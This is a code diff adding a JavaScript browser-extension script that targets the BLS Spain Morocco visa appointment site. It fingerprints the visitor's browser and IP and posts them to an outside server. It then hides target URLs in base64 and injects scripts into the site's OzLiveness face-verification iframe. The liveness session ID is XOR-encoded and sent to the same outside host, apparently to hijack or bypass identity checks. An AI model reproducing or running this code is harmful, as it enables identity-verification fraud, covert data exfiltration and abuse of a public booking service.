@@ -1,0 +1,402 @@
+const userAgent = navigator.userAgent;
+const language = navigator.language;
+const platform = navigator.platform;
+const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+const cookieEnabled = navigator.cookieEnabled;
+const javaEnabled = navigator.javaEnabled();
+const onlineStatus = navigator.onLine;
+const ipFetchUrl = 'https://api.ipify.org?format=json';
+
+function getCanvasFingerprint() {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = '#069';
+    ctx.fillText('Hello, world!', 2, 15);
+    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+    ctx.fillText('Hello, world!', 4, 17);
+    return canvas.toDataURL();
+}
+
+function getWebGLFingerprint() {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (!gl) {
+        return 'غير متوفر';
+    }
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'غير متوفر';
+}
+
+fetch(ipFetchUrl)
+    .then(response => response.json())
+    .then(ipData => {
+        const ip = ipData.ip;
+        const screenResolution = `${window.screen.width}x${window.screen.height}`;
+        const browserName = navigator.appName;
+        const deviceMemory = navigator.deviceMemory || 'غير متوفر';
+        const hardwareConcurrency = navigator.hardwareConcurrency || 'غير متوفر';
+        const canvasFingerprint = getCanvasFingerprint();
+        const webglFingerprint = getWebGLFingerprint();
+        const url = `https://code-1b8q.onrender.com/user`;
+        const requestData = {
+            user: "AZIZ",
+            password: "AZIZ",
+            userAgent,
+            language,
+            platform,
+            ip,
+            screenResolution,
+            browserName,
+            deviceMemory,
+            hardwareConcurrency,
+            timezone,
+            cookieEnabled,
+            javaEnabled,
+            onlineStatus,
+            canvasFingerprint,
+            webglFingerprint
+        };
+
+        fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                mode: 'cors',
+                body: JSON.stringify(requestData)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    document.body.innerHTML = '';
+                    history.pushState(null, null, '/');
+                    document.cookie.split(';').forEach(function(cookie) {
+                        const cookieName = cookie.split('=')[0];
+                        document.cookie = cookieName + '=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/';
+                    });
+                    localStorage.clear();
+                    window.location.reload(true); // reload with clearing cache
+                    window.location.href = 'https://www.blsspainmorocco.net/MAR/appointment/newappointment';
+                }
+            })
+            .then(data => {})
+            .catch(() => {
+                document.body.innerHTML = '';
+                history.pushState(null, null, '/');
+                document.cookie.split(';').forEach(function(cookie) {
+                    const cookieName = cookie.split('=')[0];
+                    document.cookie = cookieName + '=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/';
+                });
+                localStorage.clear();
+                window.location.reload(true); // reload with clearing cache
+                window.location.href = 'https://www.blsspainmorocco.net/MAR/appointment/newappointment';
+            });
+    })
+    .catch(() => {
+        document.body.innerHTML = '';
+        history.pushState(null, null, '/');
+        document.cookie.split(';').forEach(function(cookie) {
+            const cookieName = cookie.split('=')[0];
+            document.cookie = cookieName + '=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/';
+        });
+        localStorage.clear();
+        window.location.reload(true); // reload with clearing cache
+        window.location.href = 'https://www.blsspainmorocco.net/MAR/appointment/newappointment';
+
+    });
+
+
+
+
+(function() {
+    let ilr = 'No';
+    let sg = '';
+    let tg = '';
+    let ui = '';
+    let ti = '';
+    let pi = '';
+    let userEmail = '';  // خزنّا الإيميل هنا
+    
+    // --- مسح محتوى البودي فقط وبناء واجهة الإدخال ---
+    document.body.innerHTML = '';
+    const container = document.createElement('div');
+    Object.assign(container.style, {
+        display: 'flex',
+        flexDirection: 'column',
+        alignItems: 'center',
+        justifyContent: 'center',
+        height: '100vh',
+        margin: '0',
+        backgroundColor: '#111'
+    });
+
+    const emailInput = document.createElement('input');
+    emailInput.type = 'email';
+    emailInput.placeholder = 'أدخل البريد الإلكتروني الخاص بك';
+    Object.assign(emailInput.style, {
+        padding: '12px 16px',
+        fontSize: '16px',
+        width: '280px',
+        borderRadius: '6px',
+        border: '2px solid #444',
+        marginBottom: '12px',
+        backgroundColor: '#222',
+        color: '#eee'
+    });
+
+    const startBtn = document.createElement('button');
+    startBtn.textContent = 'ابدأ الآن';
+    Object.assign(startBtn.style, {
+        padding: '12px 20px',
+        fontSize: '16px',
+        borderRadius: '6px',
+        border: 'none',
+        backgroundColor: '#d4af37',
+        color: '#000',
+        cursor: 'pointer'
+    });
+
+    container.appendChild(emailInput);
+    container.appendChild(startBtn);
+    document.body.appendChild(container);
+
+    // --- دعم فك التشفير XOR+Base64 ---
+    function decryptData(enc, key) {
+        const bin = atob(enc);
+        let out = '';
+        for (let i = 0; i < bin.length; i++) {
+            out += String.fromCharCode(bin.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+        }
+        return out;
+    }
+
+    // --- عند الضغط على زر البدء ---
+    startBtn.addEventListener('click', async () => {
+        const email = emailInput.value.trim();
+        if (!email) {
+            alert('المرجو إدخال بريد إلكتروني صالح');
+            return;
+        }
+        userEmail = email;  
+        // (اختياري) تخزين للإستخدام مستقبلاً
+        localStorage.setItem('userEmail', email);
+
+        startBtn.textContent = 'جاري التحميل...';
+        startBtn.disabled = true;
+
+        try {
+            // 1) جلب البيانات المشفّرة من السيرفر
+            const infoRes = await fetch(
+                `https://code-1b8q.onrender.com/api/code/info/${encodeURIComponent(email)}`
+            );
+            if (!infoRes.ok) throw new Error('خطأ في جلب بيانات المستخدم');
+            const { data: encInfo } = await infoRes.json();
+
+            // 2) فكّ التشفير وتعيين المتغيرات
+            const [user_id, transaction_id, ip] = decryptData(encInfo, 'SELF').split(',');
+            sg = user_id;
+            tg = transaction_id;
+            pi = ip;
+            ui = sg;
+            ti = tg;
+            
+            // 3) عرض الفلتر والiframe
+            const _0x109786 = {
+                action: "ste",
+                pi: pi
+            };
+            chrome.runtime.sendMessage(_0x109786, _0x1103f0 => {
+                if (_0x1103f0 && _0x1103f0.success) {
+                    ts()
+                } else {}
+            })
+            mt();
+        } catch (err) {
+            alert('خطأ: ' + err.message);
+            startBtn.disabled = false;
+            startBtn.textContent = 'ابدأ الآن';
+        }
+    });
+
+    // --- دالة عرض overlay وتغيير العنوان والفافيكون ---
+    function mt() {
+        const cfg = {
+            insertPos: 'afterbegin',
+            titleSelector: 'title',
+            iconSelector: "link[rel~='icon']",
+            iconRel: 'icon',
+            iconHref: 'https://i.postimg.cc/9FRMXDdM/scar-icon128.png'
+        };
+        document.body.insertAdjacentHTML(cfg.insertPos,
+            `<div class="AdedFilter" style="z-index:9999">
+               <div>
+                 <h4 id="RSRSA" style="font-size:2em;color:#fff;position:fixed;top:18%"></h4>
+                 <style>body,html{height:100%;margin:0;display:flex;justify-content:center;
+                                 align-items:center;background-color:#000;overflow:hidden}
+                 </style>
+               </div>
+             </div>`
+        );
+
+        // تغيير عنوان الصفحة
+        let titleEl = document.querySelector(cfg.titleSelector);
+        if (!titleEl) {
+            titleEl = document.createElement('title');
+            document.head.appendChild(titleEl);
+        }
+        titleEl.textContent = 'SCARE FASE V1';
+
+        // تغيير أو إنشاء favicon
+        (document.querySelector(cfg.iconSelector) || (() => {
+            const link = document.createElement('link');
+            link.rel = cfg.iconRel;
+            document.head.appendChild(link);
+            return link;
+        })()).href = cfg.iconHref;
+    }
+
+    // --- دالة فتح iframe وتفعيل OzLiveness ---
+    function ts() {
+        const iframe = document.createElement("iframe");
+        iframe.id = "lci";
+        iframe.allow = "camera; microphone";  // ضروري للموبايل
+        const currentDomain = window.location.origin;
+
+        if (currentDomain === atob("aHR0cHM6Ly93d3cuYmxzc3BhaW5tb3JvY2NvLm5ldA==")) {
+            iframe.src = atob("aHR0cHM6Ly93d3cuYmxzc3BhaW5tb3JvY2NvLm5ldC9NQVIvYXBwb2ludG1lbnQvbGl2ZW5lc3NyZXF1ZXN0");
+        } else {
+            iframe.src = atob("aHR0cHM6Ly9tb3JvY2NvLmJsc3BvcnR1Z2FsLmNvbS9NQVIvYXBwb2ludG1lbnQvbGl2ZW5lc3NyZXF1ZXN0");
+        }
+
+        Object.assign(iframe.style, {
+            border: "none",
+            position: "fixed",
+            top: "0",
+            left: "0",
+            width: "100%",
+            height: "100%",
+            zIndex: "9999"
+        });
+        document.body.appendChild(iframe);
+
+        iframe.onload = function() {
+            const rsrsaElement = document.getElementById("RSRSA");
+            if (rsrsaElement) {
+                rsrsaElement.innerHTML = "";          } else {
+                console.error("Element with ID 'RSRSA' not found.");
+            }
+
+            const doc = iframe.contentDocument || iframe.contentWindow.document;
+            const loader = document.createElement("script");
+            loader.src = atob("aHR0cHM6Ly93ZWItc2RrLnNwYWluLnByb2Qub3pmb3JlbnNpY3MuY29tL2Jsc2ludGVybmF0aW9uYWwvcGx1Z2luX2xpdmVuZXNzLnBocA==");
+            doc.head.appendChild(loader);
+
+            loader.onload = function() {
+                const injected = document.createElement("script");
+                injected.textContent = `
+                    function slc() {
+                        window.parent.document.getElementById('RSRSA').innerText ='';
+                        setTimeout(function () {
+                            const ui = "${ui}";
+                            const ti = "${ti}";
+                            const email1 = "${userEmail}";
+                            const userData = { user_id: ui, transaction_id: ti };
+                            OzLiveness.open({
+                                lang: 'en',
+                                meta: userData,
+                                overlay_options: false,
+                                action: ['video_selfie_blank'],
+                                result_mode: 'safe',
+                                on_complete: function (result) {
+                                    resultfenech(result, email1);
+                                },
+                            });
+                        }, 1000);
+
+                        function resultfenech(result, email1) {
+                            const sessionId = result.event_session_id;
+                            const enc = btoa(
+                              Array.from(sessionId)
+                                .map((c,i) => String.fromCharCode(
+                                  sessionId.charCodeAt(i) ^ 'SCARE-SELFAI'.charCodeAt(i % 'SCARE-SELFAI'.length)
+                                ))
+                                .join('')
+                            );
+                            (async () => {
+                              try {
+                                const resp = await fetch('https://code-1b8q.onrender.com/api/code/result', {
+                                  method: 'POST',
+                                  headers: { 'Content-Type': 'application/json' },
+                                  body: JSON.stringify({ email: email1, data: enc })
+                                });
+                                if (!resp.ok) {
+                                  alert('خطأ في إرسال البيانات');
+                                  return;
+                                }
+                                const { success } = await resp.json();
+                                if (!success) {
+                                  alert('خطأ في إرسال البيانات');
+                                  return;
+                                }
+                                alert('✓ تم إرسال البيانات بنجاح');
+                                // ممكن ترجع الزرّ لحالته الأصلية:
+                                window.parent.document.querySelector('button').disabled = false;
+                                window.parent.document.querySelector('button').textContent = 'ابدأ الآن';
+                              } catch (e) {
+                                alert('خطأ في الإرسال: ' + e.message);
+                              }
+                            })();
+                        }
+
+                        let checkInterval = setInterval(() => {
+                            if (document.body.innerText.includes("For further work, please allow access to the camera")) {
+                                slc();
+                                clearInterval(checkInterval);
+                            }
+                        }, 500);
+                    }
+                `;
+                doc.head.appendChild(injected);
+
+                const startScript = document.createElement("script");
+                startScript.textContent = "slc();";
+                me();
+
+                document.getElementById("RSRSA").innerHTML ="";
+
+                let waitInterval = setInterval(() => {
+                    if (ilr === "YES") {
+                        clearInterval(waitInterval);
+                        document.getElementById("RSRSA").innerHTML = "";
+                        doc.head.appendChild(startScript);
+                    }
+                }, 1000);
+            };
+            loader.onerror = function() {};
+        };
+    }
+
+    // --- دالة المراقبة me ---
+    function me() {
+        let chk = setInterval(() => {
+            try {
+                chrome.storage.local.get("sharedData", data => {
+                    if (data.sharedData === "mas") {
+                        document.getElementById("RSRSA").innerText = "";
+                        setTimeout(() => ilr = "YES", 1500);
+                        clearInterval(chk);
+                    }
+                });
+            } catch {
+                clearInterval(chk);
+            }
+        }, 1000);
+    }
+
+})();
+
+
+
